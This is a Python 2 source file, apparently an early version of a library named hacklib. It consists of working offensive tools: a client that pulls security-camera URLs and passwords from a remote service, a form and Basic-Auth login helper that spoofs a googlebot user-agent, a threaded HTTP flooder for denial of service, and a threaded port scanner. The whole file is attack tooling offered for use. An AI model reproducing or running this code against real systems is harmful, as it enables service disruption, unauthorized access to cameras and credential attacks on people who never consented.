'''Copyright (c) 2016 Leon Li (leon@apolyse.com)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
associated documentation files (the "Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial
portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''

import socket, httplib, threading, time, urllib2
from queue import Queue

class CamHacker:
    '''Summons a security camera hacker from the cloud.
    '''

    def __init__(self, auth_key):
        self._repository = 'https://apolyse.com/hacklib/cams.php'
        self.auth_key = auth_key

    def _request(self, url):                 
        return urllib2.urlopen(url + '?key=' + self.auth_key).read()

    def hack(self):
        '''Returns cam URL and login details.
        '''
        data = self._request(self._repository)
        if '|' not in data:
            print 'Invalid key.'
            return
        data_list = data.split('|')
        print 'Security Cam URL: ' + data_list[0] + '\n' + 'Username: ' + data_list[1] + '\n' + 'Password: ' + data_list[2]
        return

class AuthClient:
    '''Universal login tool for most login pages as well as HTTP Basic Authentication.
    '''

    def __init__(self):
        self.url = ''
        self.username = ''
        self.password = ''

    def _get_login_type(self):
        try:
            # Attempts to urlopen target URL without exception
            data = urllib2.urlopen(self.url)
            return 'FORM'
        except Exception, e:
            print str(e)
            if 'error 401' in str(e).lower():
                return 'BA'
            if 'timed out' in str(e).lower():
                return 'TO'
            
    def _login_mechanize(self):
        try:
            import mechanize
        except:
            raise Exception('Please install mechanize module before continuing. (pip install mechanize)')
        # Sets up common input names/ids and creates instance of mechanize.Browser()
        userfields = ['user', 'username', 'usr', 'email', 'name', 'login', 'userid', 'userid-input', 'player']
        passfields = ['pass', 'password', 'passwd', 'pw']
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_refresh(False)
        br.addheaders = [('User-agent', 'googlebot')]
        # Opens URL and lists controls
        response = br.open(self.url)
        loginurl = response.geturl()
        br.form = list(br.forms())[0]
        username_control = ''
        password_control = ''
        # Locates username and password controls, and submits login info
        for control in br.form.controls:
            if control.name in userfields or control.id in userfields: username_control = control
            if control.name in passfields or control.id in passfields: password_control = control
        username_control.value = self.username
        password_control.value = self.password
        response = br.submit()
        # Returns response if the URL is changed. Assumes login failure if URL is the same
        if response.geturl() != loginurl:
            return response.read()
        else:
            return False

    def _login_BA(self):
        try:
            # Creates a PasswordMgr instance
            passmanager = urllib2.HTTPPasswordMgrWithDefaultRealm()
            passmanager.add_password(None, self.url, self.username, self.password)
            # Creates an auth handling object and builds it with opener
            auth = urllib2.HTTPBasicAuthHandler(passmanager)
            opener = urllib2.build_opener(auth)
            response = opener.open(self.url, timeout=8)
            response.close()
            return True
        except Exception, e:
            print str(e)
            if 'Error 401' in str(e):
                return False
            
    def login(self, url, username, password):
        self.url = url
        self.username = username
        self.password = password
        # ascertain the type of login page given by url
        logintype = self. _get_login_type()
        if logintype == 'BA':
            # attempts to login with BA method and return True
           return self._login_BA()
        if logintype == 'TO':
            print 'Request timed out.'
            return False
        if logintype == 'FORM':
            return self._login_mechanize()

class DOSer:
    '''Hits a host with packets from multiple threads.
    '''

    def __init__(self):
        self.target = '127.0.0.1'
        self.threads = 1
        self.payload = '?INTERIORCROCODILEALLIGATORIDRIVEACHEVROLETMOVIETHEATER'
        self.start_time = 0
        self.time_length = 1

    def _attack(self, target, port=80):  
        # Sends GET requests for time_length duration
        while int(time.time()) < self.start_time + self.time_length:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            try:
                s.connect((self.target, port))
                s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
                s.send("Host: " + self.target  + "\r\n\r\n")
            except: pass

    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._attack(self.worker)
            self.q.task_done()

    def launch(self, host, duration, threads = 1, payload = 'default'):
        '''Launches threaded GET requests for (duration) seconds.
        '''
        self.target = host
        self.threads = threads
        self.start_time = int(time.time())
        self.time_length = duration
        if payload != 'default': self.payload = payload
        # Creates queue to hold each thread
        self.q = Queue()
        print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
        for i in range(threads):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(0, threads):
            self.q.put(worker)

        self.q.join()

class PortScanner:
    '''Scan an IP address using scan(host) with default port range of 1025
    '''

    def __init__(self):
        self.IP = '127.0.0.1'
        self.port_range = '1025'
        self.print_lock = threading.Lock()
        self.timeout = 2
        self.openlist = []
        self.verbose = True

    def _portscan(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        # Tries to establish a connection to port, and append to list of open ports
        try:
            con = s.connect((self.IP,port))
            response = s.recv(1024)
            self.openlist.append(port)
            if self.verbose:
                with self.print_lock:
                    print 'Port', str(port) + ':'
                    print response
            s.close()
        # If the connection fails, tries to establish HTTP connection
        except Exception, e:
            httplist = [80, 443, 1900, 2082, 2083, 8080, 8443]
            if port in httplist:
                try:
                    s.send('GET HTTP/1.1 \r\n')
                    s.send("Host: " + self.IP + "\r\n\r\n")
                    response = s.recv(1024)
                    self.openlist.append(port)
                    if self.verbose:
                        with self.print_lock:
                            print 'Port', str(port) + ':'
                            print response
                    s.close()
                except: pass
                
    def portOpen(self, port):
        if port in self.openlist:
            return
        else:
            return False
        
    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._portscan(self.worker)
            self.q.task_done()

    def scan(self, IP, port_range = 1025, timeout = 1, verbose = True):
        '''Scans ports of an IP address. Use getIP() to find IP address of host.
        '''
        self.openlist = []
        self.IP = IP
        self.port_range = port_range
        self.timeout = 1
        # Creates queue to hold each thread
        self.q = Queue()
        for x in range(30):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(1, port_range):
            self.q.put(worker)

        self.q.join()
        
def getIP(host):
    return socket.gethostbyname(host)

def send(IP, port, message, keepalive = False):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection = s.connect((IP, port))
    s.send(message)
    response = s.recv(1024)
    if not keepalive:
        s.close()
    return response
